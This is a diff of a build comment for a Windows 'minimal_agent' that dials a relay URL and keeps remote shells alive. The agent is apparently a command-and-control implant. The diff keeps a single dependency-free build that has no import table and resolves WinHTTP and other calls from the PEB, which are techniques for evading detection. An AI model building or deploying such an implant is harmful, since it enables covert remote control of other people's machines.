@@ -19,26 +19,23 @@
  *               Only the Exit command (or killing the process) ends it;
  *               live shells survive a redial.
  *
- * Build - no -lwinhttp: every WinHTTP call is resolved at runtime from
- * the PEB (winhttp_api.c). Two flavors:
+ * Build - the single flavor is DEPENDENCY-FREE: no CRT, no import table,
+ * no -lwinhttp. Every OS call (WinHTTP included) is resolved at runtime
+ * from the PEB; the process starts at our own entry (entry.c), not the
+ * CRT startup. Two steps - compile, then link:
  *
- * CRT flavor (development default - links the mingw startup):
- *   gcc -O2 -s -Wall -Wextra -o minimal_agent.exe main.c \
- *       transport.c shell.c report.c system_facts.c winhttp_api.c \
- *       memory.c string.c kernel32.c advapi.c ntdll.c peb.c \
- *       system.c djb2.c logger.c -ladvapi32
- *
- * Dependency-free flavor (-nostdlib: empty import table, own entry):
  *   gcc -O2 -c main.c transport.c shell.c report.c system_facts.c \
  *       winhttp_api.c memory.c string.c kernel32.c advapi.c ntdll.c \
  *       peb.c system.c djb2.c logger.c entry.c
- *   gcc -O2 -nostdlib -e entry -o minimal_agent_free.exe \
+ *   gcc -O2 -s -nostdlib -e entry -o minimal_agent.exe \
  *       entry.o main.o transport.o shell.o report.o system_facts.o \
  *       winhttp_api.o memory.o string.o kernel32.o advapi.o ntdll.o \
  *       peb.o system.o djb2.o logger.o
- * (note: entry.c MUST be in the object list and -e entry names the
- *  real entry point - omitting either leaves ___chkstk_ms and the
- *  startup contract unresolved)
+ *
+ * (entry.c MUST be in the object list and -e entry names the real entry
+ *  point - omitting either leaves ___chkstk_ms unresolved or the entry
+ *  address pointing at the wrong symbol. Verify with:
+ *  objdump -f minimal_agent.exe | grep "start address" vs nm entry)
  *
  * Run:
  *   minimal_agent.exe <URL>        e.g. ... https://relay.example.com/agent
